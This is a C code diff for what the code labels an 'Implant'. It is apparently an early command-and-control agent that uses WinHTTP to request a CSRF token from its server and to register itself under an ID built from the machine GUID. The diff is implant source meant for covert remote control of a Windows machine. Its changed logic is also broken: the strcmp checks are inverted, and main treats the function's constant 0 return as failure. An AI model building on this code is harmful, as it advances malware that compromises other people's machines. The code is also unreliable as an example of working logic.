@@ -114,14 +114,15 @@ LPSTR SentToServer(LPCWSTR VERB, LPCWSTR PATH, uint8_t *buffer, pb_ostream_t str
 		WinHttpCloseHandle(hSession);
         
 		return responseBuffer;
+	} else {
+		// Clean up
+		WinHttpCloseHandle(hRequest);
+		WinHttpCloseHandle(hConnect);
+		WinHttpCloseHandle(hSession);
+		return "";
 	}
 
-        // Clean up
-        WinHttpCloseHandle(hRequest);
-        WinHttpCloseHandle(hConnect);
-        WinHttpCloseHandle(hSession);
 
-	return void;
 }
 
 LPSTR CSRFToken;
@@ -129,10 +130,16 @@ LPSTR CSRFToken;
 int GetCSRFToken() {
 	uint8_t buffer[4096];
 	pb_ostream_t stream = pb_ostream_from_buffer(buffer, sizeof(buffer));
-	uint8_t *response = SentToServer(GET_VERB, CSRF_PATH, buffer, stream);
+	LPSTR response = SentToServer(GET_VERB, CSRF_PATH, buffer, stream);
+
+	if (strcmp(response, "")){
+		DEBUG_PRINTF("Failed to get a CSRF Token from Server.");
+		DEBUG_PRINTF("response = %s", response);
+	}
+
 	CSRFToken = response;
 	printf("NEW CSRF TOKEN = %s\n", CSRFToken);
-	return status;
+	return 0;
 }
 
 // Function to set the ImplantID using the machine's GUID
@@ -176,8 +183,14 @@ int RegisterSelf() {
 
 	uint8_t buffer[4096];
 	pb_ostream_t stream = ReadyRegisterImplantToSend(buffer, ri);
-	int status = SentToServer(POST_VERB, REGISTER_PATH, buffer, stream);
-	return status;
+	LPCSTR response = SentToServer(POST_VERB, REGISTER_PATH, buffer, stream);
+	
+	if (strcmp(response, "")){
+                DEBUG_PRINTF("Bad response.");
+                DEBUG_PRINTF("response = %s", response);
+        }	
+	
+	return 0;
 }
 
 
@@ -185,15 +198,16 @@ int main() {
 	DEBUG_PRINTF("Starting Implant.\n");
 	
 	
-	BOOL result = GetCSRFToken();
+	int result = GetCSRFToken();
 	
 	if (!result) {
                 DEBUG_PRINTF("Failed to get CSRF token from the Server!\n");
-                return 1;
+                printf("CSRF TOKEN = %s", CSRFToken);
+		return 1;
         }
         printf("Successfully recieved CSRF token from Server\n");
 
-	
+	/**
 	result = RegisterSelf();
 
 	if (!result) {
@@ -201,7 +215,7 @@ int main() {
 		return 1;
 	}
 	printf("Successfully registered implant with Server!\n");
-	
+	**/
 	return 0;
 }
 
